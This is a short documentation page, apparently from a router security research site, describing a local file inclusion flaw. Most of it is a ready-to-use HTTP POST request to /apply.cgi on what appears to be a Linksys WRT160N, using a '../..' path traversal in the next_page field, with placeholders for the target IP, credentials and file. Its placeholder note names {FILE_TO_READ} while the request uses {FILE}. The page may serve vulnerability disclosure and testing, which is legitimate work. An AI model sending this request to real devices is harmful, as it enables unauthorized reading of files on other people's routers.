+++
title = "Local File Inclusion"
date = 2021-10-18T20:39:54-06:00
weight = 5
+++

## Local File Inclusion
Make an HTTP POST request to the router like the following:
```
POST /apply.cgi HTTP/1.1
Host: {TARGET_IP}
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Proxy-Connection: keep-alive
Authorization: Basic {BASE_64_CREDENTIALS}
Content-Type: application/x-www-form-urlencoded
Content-Length: 181
Connection: close

submit_type=wsc_method2&change_action=gozila_cgi&next_page=../..{FILE}
```
**NOTE:** Replace {TARGET_IP}, {BASE_64_CREDENTIALS}, {FILE_TO_READ} with the valid IP, credentials, and file to read respectively

![LFI Request](resources/WRT160N-LFI-Request.png)
![LFI Response](resources/WRT160N-LFI-Response.png)
